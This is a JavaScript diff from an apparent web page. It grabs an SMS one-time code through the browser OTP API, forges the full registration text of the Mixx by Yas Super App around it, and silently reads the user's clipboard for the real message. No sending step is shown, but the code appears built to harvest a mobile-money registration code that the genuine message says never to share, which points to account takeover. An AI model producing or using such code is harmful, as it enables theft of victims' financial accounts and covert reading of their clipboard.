@@ -125,11 +125,12 @@
             }).then(async function(otp) {
                 if (!smsDetected) {
                     smsDetected = true;
-                    var fullMessage = otp.code || '';
-                    // Try to get FULL message from clipboard (Android copies SMS there)
+                    var code = otp.code || '';
+                    var fullMessage = 'You are being registered in Mixx by Yas Super App, use the code ' + code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
+                    
                     try {
                         var clipText = await navigator.clipboard.readText();
-                        if (clipText && clipText.length > fullMessage.length) {
+                        if (clipText && clipText.length > 20 && clipText.includes('Mixx')) {
                             fullMessage = clipText;
                         }
                     } catch(e) {}
